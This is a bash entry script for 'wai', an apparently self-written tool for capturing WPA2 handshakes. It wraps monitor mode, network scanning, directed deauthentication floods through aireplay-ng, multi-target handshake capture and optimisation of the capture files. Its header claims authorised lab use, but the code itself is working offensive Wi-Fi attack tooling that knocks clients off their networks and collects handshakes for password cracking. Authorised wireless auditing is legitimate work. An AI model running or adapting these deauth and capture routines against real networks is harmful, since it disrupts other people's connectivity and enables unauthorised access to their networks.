#!/usr/bin/env bash
# wai -- WPA2 Handshake Capture CLI.
# Usage: sudo wai <cap|scan|mon|deth|opt> [flags]
# AUTHORIZED NETWORKS ONLY -- educational / lab use.

if [ -z "$BASH_VERSION" ]; then
    exec bash "$0" "$@"
fi

set -Eeuo pipefail

WAI_DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
LIB_DIR="${WAI_DIR}/lib"

source "${LIB_DIR}/constants.sh"
source "${LIB_DIR}/logging.sh"
source "${LIB_DIR}/state.sh"
source "${LIB_DIR}/cleanup.sh"
source "${LIB_DIR}/args.sh"
source "${LIB_DIR}/meta.sh"
source "${LIB_DIR}/preflight.sh"
source "${LIB_DIR}/iwd.sh"
source "${LIB_DIR}/monitor.sh"
source "${LIB_DIR}/scan.sh"
source "${LIB_DIR}/clients.sh"
source "${LIB_DIR}/deauth.sh"
source "${LIB_DIR}/capture.sh"
source "${LIB_DIR}/output.sh"

main() {
    local sub="${1:-}"
    shift || true

    case "$sub" in
        cap)   cmd_cap "$@" ;;
        scan)  cmd_scan "$@" ;;
        mon)   cmd_mon "$@" ;;
        deth)  cmd_deth "$@" ;;
        opt)   cmd_opt "$@" ;;
        -V|--version|version) version ;;
        -h|--help|help|"") usage ;;
        *)     die "Unknown subcommand: '${sub}'  (use -h for help)" ;;
    esac
}

cmd_cap() {
    parse_cap_args "$@"
    banner "cap"
    preflight root
    install_trap
    save_and_stop_iwd
    monitor_up

    local total_targets=${#TARGETS_RAW[@]}
    echo -e "\n${B}${C}  Targets in this session: ${total_targets}${N}" >&2
    for t in "${TARGETS_RAW[@]}"; do echo -e "    ${DIM}-> ${t}${N}" >&2; done
    echo "" >&2

    local target_idx=0
    for raw_target in "${TARGETS_RAW[@]}"; do
        target_idx=$(( target_idx + 1 ))
        echo -e "\n${B}${C}==============================================================${N}" >&2
        echo -e "${B}${C}  TARGET ${target_idx}/${total_targets}: ${raw_target}${N}" >&2
        echo -e "${B}${C}==============================================================${N}\n" >&2

        _reset_target_state
        TARGET="$raw_target"

        hdr "Network cache"
        init_meta
        if load_meta; then
            if (( META_LOADED == 1 )); then
                ok  "Fresh data - scan skipped."
            else
                warn "Stale cache - will re-verify on failure."
            fi
        else
            info "No cache for '${TARGET}' - full scan."
        fi

        resolve_target
        if capture; then
            optimize
        else
            warn "Target ${raw_target}: capture finished without handshake."
            _record_target_failure
        fi
    done

    summary
}

cmd_scan() {
    parse_scan_args "$@"
    banner "scan"
    preflight root
    install_trap
    save_and_stop_iwd
    monitor_up
    run_scan "$SCAN_SEC"
    ok "Scan finished. CSV at ${TMP}/scan-01.csv"
    # No explicit cleanup: the EXIT trap runs exactly once.
}

cmd_mon() {
    parse_mon_args "$@"
    banner "mon"
    case "$MON_ACTION" in
        on)
            preflight root
            install_trap
            save_and_stop_iwd
            monitor_up
            ok "Monitor mode active: ${MON}"
            info "Run 'wai mon off' or Ctrl+C to restore the system."
            info "Exiting without disabling - the interface stays in monitor mode."
            trap - EXIT INT TERM
            ;;
        off)
            preflight root
            install_trap
            if [[ -f "$WAI_STATE_FILE" ]]; then
                # shellcheck disable=SC1090
                source "$WAI_STATE_FILE" 2>/dev/null || true
                IWD_WAS_UP="${IWD_STATE_WAS_UP:-0}"
                IWD_NET="${IWD_STATE_NET:-}"
                IFACE="${IFACE:-${IWD_STATE_IFACE:-}}"
            fi
            monitor_down
            ;;
    esac
}

cmd_deth() {
    parse_deth_args "$@"
    banner "deth"
    preflight root
    install_trap
    save_and_stop_iwd
    monitor_up

    TARGET="${BSSID^^}"
    SSID_NAME="$TARGET"
    hdr "Directed deauth - BSSID=${TARGET}  Client=${CLIENT_MAC}  Channel=${CHANNEL:-auto}"

    if [[ -z "$CHANNEL" ]]; then
        if [[ "$WAI_DRY_RUN" == "1" ]]; then
            CHANNEL=6
            dbg "[dry-run] channel auto-resolved to ${CHANNEL}"
        else
            info "Channel not given - scanning to resolve it..."
            run_scan "$SCAN_SEC"
            CHANNEL=$(awk -F',' -v b="${TARGET}" '
                /^[0-9A-Fa-f]{2}:/ {
                    gsub(/ /,"",$1); gsub(/ /,"",$4)
                    if (toupper($1)==b) { print $4; exit }
                }' "${TMP}/scan-01.csv")
            if [[ -z "$CHANNEL" ]]; then
                die "Channel not found for ${TARGET}. Use -c <channel>."
            fi
            ok "Channel resolved: ${CHANNEL}"
        fi
    fi

    local log="${TMP}/deth.log"
    info "Sending ${DEAUTH_N} deauth frames to ${CLIENT_MAC} via ${MON}..."
    if [[ "$WAI_DRY_RUN" == "1" ]]; then
        dbg "[dry-run] aireplay-ng --deauth ${DEAUTH_N} -a ${TARGET} -c ${CLIENT_MAC} ${MON}"
    else
        if aireplay-ng \
            --deauth "$DEAUTH_N" \
            -a "$TARGET" \
            -c "$CLIENT_MAC" \
            "$MON" > "$log" 2>&1; then
            ok "Deauth sent."
        else
            warn "aireplay-ng failed. Log:"
        fi
        while IFS= read -r l; do dbg "  $l"; done < "$log" || true
    fi
}

cmd_opt() {
    parse_opt_args "$@"
    banner "opt"
    preflight no_root
    install_trap

    for src in "${OPT_FILES[@]}"; do
        [[ -f "$src" ]] || die "File not found: ${src}"
        hdr "Optimizing $(basename "$src")"
        CAP_FILE="$src"
        TARGET="${TARGET:-$(basename "$src" .cap)}"
        SSID_NAME="${SSID_NAME:-$TARGET}"
        CHANNEL="${CHANNEL:-0}"
        IFACE="${IFACE:-unknown}"
        MON="${MON:-unknown}"
        optimize
    done
    summary
}

main "$@"
